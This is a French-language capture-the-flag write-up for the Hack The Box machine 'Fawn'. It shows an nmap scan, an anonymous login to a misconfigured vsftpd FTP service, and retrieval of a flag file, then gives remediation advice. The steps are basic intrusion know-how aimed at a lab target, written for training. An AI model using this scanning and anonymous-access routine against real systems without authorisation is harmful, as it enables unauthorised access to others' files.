HTB — Fawn (Starting Point)

Difficulté : Very Easy OS : Linux (Unix) Catégorie : Starting Point

Résumé

Fawn est une machine d'introduction axée sur l'énumération et l'exploitation d'un service FTP mal configuré, autorisant une connexion anonyme donnant accès directement au flag.

1. Connexion au VPN

Connexion au lab HTB via OpenVPN (pool Starting Point) :

bash
sudo openvpn --config starting_points_eu-starting-point-1-dhcp.ovpn

Vérification de la connectivité vers la cible :

bash
ping -c 5 10.129.27.114
2. Reconnaissance / Scan de ports

Un scan Nmap avec détection de version permet d'identifier les services exposés :

bash
sudo nmap -sV 10.129.27.114

Résultat :

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Un seul port est ouvert : 21/tcp, exécutant vsftpd 3.0.3 sur un hôte Unix.

3. Énumération du service FTP

Connexion au service FTP avec le client en ligne de commande :

bash
ftp 10.129.27.114

Le serveur FTP autorise l'authentification anonyme, une misconfiguration classique :

Name (10.129.27.114:user): anonymous
331 Please specify the password.
Password: (n'importe quel mot de passe)
230 Login successful.
4. Récupération du flag

Une fois connecté, listage du contenu du répertoire :

ftp> ls
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

Téléchargement du fichier trouvé :

ftp> get flag.txt
ftp> bye

Lecture du flag en local :

bash
cat flag.txt
Conclusion

Cette machine illustre un cas très courant en environnement réel : un service FTP laissé accessible en mode anonyme, exposant des fichiers sensibles sans aucune authentification réelle. La remédiation consiste à désactiver l'accès anonyme (anonymous_enable=NO dans vsftpd.conf) et, idéalement, à remplacer FTP par SFTP pour chiffrer les transferts.

Résumé des commandes
Étape	Commande
Scan de ports/versions	sudo nmap -sV <IP>
Connexion FTP	ftp <IP>
Login anonyme	anonymous / mot de passe libre
Lister les fichiers	ls
Télécharger un fichier	get <fichier>
Quitter la session	bye